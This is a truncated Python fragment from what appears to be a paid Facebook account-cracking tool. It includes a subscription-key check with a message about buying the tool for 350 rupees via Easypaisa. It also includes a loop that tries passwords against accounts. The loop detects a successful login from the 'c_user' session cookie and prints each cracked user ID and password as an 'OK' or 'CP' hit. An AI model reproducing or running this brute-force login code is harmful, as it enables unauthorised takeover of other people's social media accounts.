...
def Subscraption():
	...
	if key1 in r1:
		...
		time.sleep(3.5)
		tks = '*ASALAMUALIKUM*%2C%20*print-AXI-SIR*%20*I*%20*BUY*%20*RS350EASYPAISA*%20*YOUR*%20*AXI*%20*NEW*%20*---*%20*TOOL*%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*:*'+naim+''+key1
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\033[1;92m[OK-AXI] '+cid+' | '+ps+'\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\033[1;91m[CP-AXI] '+cid+' | '+ps+'\033[0;97m')
